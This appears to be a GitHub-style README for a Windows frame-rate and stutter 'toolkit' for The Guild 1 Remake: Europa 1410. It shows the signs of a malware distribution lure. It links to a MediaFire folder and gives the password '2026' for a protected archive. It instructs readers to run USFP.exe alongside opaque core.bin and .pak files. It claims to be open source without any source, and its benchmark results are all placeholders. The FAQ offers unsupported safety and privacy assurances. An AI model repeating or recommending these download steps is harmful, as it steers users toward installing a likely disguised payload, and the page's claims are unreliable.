<div align="center">

# 🎮 The Guild 1 Remake: Europa 1410 — Performance Notes

**Measure frame delivery, startup behavior, and session stability.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

The Guild 1 Remake: Europa 1410 is a medieval economic and life simulation with strategy, role-playing, crafting, trade, and political systems. It uses Unreal Engine 5 and depicts a European setting around the year 1410. Large cities, simulation activity, and an overhead camera make consistent frame delivery important during extended sessions.

This tool is intended for Windows players and maintainers who want reproducible diagnostics for The Guild 1 Remake: Europa 1410.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2977260/b8e4c001ddad487aad7213a8ed6d97ba6f1f2e3a/ss_b8e4c001ddad487aad7213a8ed6d97ba6f1f2e3a.1920x1080.jpg?t=1789971895" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2977260/1ba39a24698f2b44bbaf873a2a3992d9657bcd81/ss_1ba39a24698f2b44bbaf873a2a3992d9657bcd81.1920x1080.jpg?t=1789971895" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2977260/7d5699c1d4bbb865e54553a77f6d969533d36f97/ss_7d5699c1d4bbb865e54553a77f6d969533d36f97.1920x1080.jpg?t=1789971895" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- Frame-time spikes during camera movement and dense city scenes can produce inconsistent 1% low FPS.
- Shader and graphics-cache work during startup can extend launch time and cause temporary stutter.
- Long sessions may require crash diagnostics and recovery after freezes or application termination.

## 🩺 How the toolkit addresses these issues

- **Inconsistent frame delivery in dense scenes** → Frame Rate Helper — adjusts frame delivery behavior; Frame Timing Helper — stabilizes frame delivery.
- **Startup shader and cache delays** → Startup Parameter Tool — applies tuned startup parameters; Graphics Cache Utility — manages graphics cache data.
- **Freezes or terminated sessions** → Stability Report + Session Recovery — diagnostic collection + recovery; Process Scheduling Helper — optimizes process scheduling.

## 📊 Test results

Test rig: Reference rig for local validation: Ryzen 5 5600, RTX 3060, 16GB RAM, SSD, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | Pending measured run | Pending measured run |
| 1% low FPS | Pending measured run | Pending measured run |
| Crashes per 2h session | Pending measured run | Pending measured run |
| Shader compile time on launch | Pending measured run | Pending measured run |


## 🚀 How to use

1. download the latest release from the link in the README
2. point the tool to the game's installation folder
3. select the game profile from the supported list
4. click Apply
5. on first launch allow the cache to rebuild for 1-2 minutes

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for repeatable frame-rate testing.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters without editing configuration files manually.
- 🎯 **Frame Timing Helper** — Stabilizes frame delivery and records frame-time variance.
- 🧠 **Process Scheduling Helper** — Optimizes process scheduling while the game is running.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and supports recovery after interrupted sessions.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and provides controlled rebuild operations.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- core.bin <- Core runtime
|-- shader_cache.pak <- Shader cache data
|-- frame_data.pak <- Display sync data
|-- fps_module.dll <- FPS module
|-- Password 2026.txt <- Password reminder (empty)
|-- config.cfg <- User configuration
|-- crash_reader.dll <- Crash log reader
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Can I use it alongside other tools?**
**A:** Yes. It does not conflict with other monitoring or performance tools. It only reads OS-level counters and manages its own temporary folders.

**Q: Is it safe to use?**
**A:** Yes. It runs as a standalone executable, does not install anything system-wide, and can be removed by deleting its folder.

**Q: Can I revert the changes?**
**A:** Yes. Simply close the game, exit the tool, and launch the game again without it. No changes persist after the process is terminated.

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

---

*This is an unofficial, open-source tool. Not affiliated with or endorsed by the developer/publisher of **The Guild 1 Remake: Europa 1410**. All trademarks belong to their respective owners. Use at your own risk — backing up your game's configuration files before applying changes is recommended.*